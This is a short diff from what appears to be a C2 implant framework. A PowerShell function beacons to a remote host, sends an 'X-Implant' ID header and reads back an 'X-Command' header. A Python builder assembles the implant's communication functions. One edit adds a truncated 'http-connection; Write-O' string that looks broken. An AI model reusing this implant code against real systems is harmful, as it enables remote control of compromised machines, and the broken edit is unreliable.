@@ -69,7 +69,7 @@ function https-connection(){
         $URL = "https://"+$sgep+":8080/index"
         $kk = [System.Net.WebRequest]::Create($URL);
         $kk.Method = "POST"
-        $kk.Headers.Add("X-Implant","420506")
+        $kk.Headers.Add("X-Implant","{{ uii }}")
         $kk.Timeout = 10000;
         $LoginResponse = $kk.GetResponse()
         $bb = $LoginResponse.Headers["X-Command"]
@@ -160,7 +160,7 @@ while($true){
         constructed_implant = self._manage_implant_function_order(id, implant_functions)
         string = ""
         proto_count = 0
-        proto_list = {'comms_http': 'http-connection',
+        proto_list = {'comms_http': 'http-connection; Write-O',
                       'comms_https': 'https-connection',
                       'comms_dns': 'dns-connection'}
 
